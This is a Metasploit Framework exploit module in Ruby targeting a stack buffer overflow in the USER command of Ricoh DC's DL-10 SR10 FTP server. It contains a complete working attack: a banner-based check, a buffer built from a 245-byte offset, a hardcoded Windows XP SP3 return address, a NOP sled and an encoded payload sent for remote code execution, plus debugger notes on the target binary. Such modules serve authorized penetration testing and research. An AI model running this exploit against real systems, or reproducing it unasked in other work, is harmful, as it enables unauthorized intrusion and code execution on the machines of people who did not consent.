##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in Ricoh DC's DL-10 SR10 FTP
				service.  By supplying a long string of data to the USER command, it is
				possible to trigger a stack-based buffer overflow, which allows remote code
				execution under the context of the user.

					Please note that in order to trigger the vulnerability, the server must
				be configured with a log file name (by default, it's disabled).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Julien Ahrens', #Discovery, PoC
					'sinn3r'         #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '79691'],
					['URL', 'http://secunia.com/advisories/47912'],
					['URL', 'http://www.inshell.net/2012/03/ricoh-dc-software-dl-10-ftp-server-sr10-exe-remote-buffer-overflow-vulnerability/']
				],
			'Payload'        =>
				{
					# Yup, no badchars
					'BadChars' => "\x00",
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "process",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3',
						{
							'Ret'    => 0x77c35459,  #PUSH ESP; RETN (msvcrt.dll)
							'Offset' => 245
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Mar 1 2012",
			'DefaultTarget'  => 0))

		# We're triggering the bug via the USER command, no point to have user/pass
		# as configurable options.
		deregister_options('FTPPASS', 'FTPUSER')
	end

	def check
		connect
		disconnect
		if banner =~ /220 DSC ftpd 1\.0 FTP Server/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		buf = ''
		buf << rand_text_alpha(target['Offset'], payload_badchars)
		buf << [target.ret].pack('V')
		buf << make_nops(20)
		buf << payload.encoded

		print_status("#{rhost}:#{rport} - Sending #{self.name}")
		connect
		send_user(buf)
		handler
		disconnect
	end
end

=begin
0:002> lmv m SR10
start    end        module name
00400000 00410000   SR10       (deferred)             
    Image path: C:\Program Files\DC Software\SR10.exe
    Image name: SR10.exe
    Timestamp:        Mon May 19 23:55:32 2008 (483275E4)
    CheckSum:         00000000
    ImageSize:        00010000
    File version:     1.0.0.520
    Product version:  1.0.0.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Ricoh Co.,Ltd.
    ProductName:      SR-10
    InternalName:     SR-10
    OriginalFilename: SR10.EXE
    ProductVersion:   1, 0, 0, 0
    FileVersion:      1, 0, 0, 520
    PrivateBuild:     1, 0, 0, 520
    SpecialBuild:     1, 0, 0, 520
    FileDescription:  SR-10


Note: No other DC Software dlls are loaded when SR-10.exe is running, so the most
stable component we can use is msvcrt.dll for now.
=end